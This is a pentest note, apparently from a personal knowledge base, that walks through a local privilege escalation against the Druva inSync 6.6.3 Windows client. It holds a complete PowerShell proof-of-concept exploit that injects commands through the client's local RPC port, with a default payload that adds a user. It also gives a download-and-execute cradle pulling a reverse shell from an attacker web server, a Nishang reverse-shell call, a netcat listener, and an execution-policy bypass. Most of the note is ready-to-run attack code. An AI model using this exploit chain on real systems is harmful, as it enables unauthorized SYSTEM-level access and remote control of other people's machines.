---
id: Druva
aliases: []
tags:
  - Microsoft/Windows/Privesc/Software/Druva
links: Privesc
---

# Druva

## Privesc

**Druva inSync Windows Client Local Privilege Escalation Example**

1. **TARGET**: Verify vulnerable Druva inSync version

```sh
wmic product get name
```

```sh
Druva inSync 6.6.3
```

1. **TARGET**: Modify the POC (*`Druva.ps1`*)

<!-- Example {{{-->
> [!example]- POC
>
> ```PowerShell
> $ErrorActionPreference = "Stop"
>
> $cmd = "net user pwnd /add"
>
> $s = New-Object System.Net.Sockets.Socket(
>     [System.Net.Sockets.AddressFamily]::InterNetwork,
>     [System.Net.Sockets.SocketType]::Stream,
>     [System.Net.Sockets.ProtocolType]::Tcp
> )
> $s.Connect("127.0.0.1", 6064)
>
> $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
> $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
> $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
> $length = [System.BitConverter]::GetBytes($command.Length);
>
> $s.Send($header)
> $s.Send($rpcType)
> $s.Send($length)
> $s.Send($command)
> ```
<!-- }}} -->

Modify the `$cmd` variable to the command to execute:

- Add a local admin user
- Reverse shell

[[Pentest/File Transfer/Windows/Download|Download]] the PowerShell reverse shell
from the attacker web server into the target's memory

```sh
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<attacker_ip>:8080/shell.ps1')"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
> ```
<!-- }}} -->

2. **ATTACKER**: Modify [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Append a reverse shell to the end of the script

```sh
Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port <attacker_port>
```

3. **ATTACKER**: Start a Python web server and serve [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```sh
python3 -m http.server 8080
```

4. **ATTACKER**: Start a [[Netcat]] listener

```sh
nc -lvnp 1234
```

5. **TARGET**: [Modify PowerShell execution policy](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

6. **TARGET**: Launch the POC (*`Druva.ps1`*)

```sh
.\Druva.ps1
```
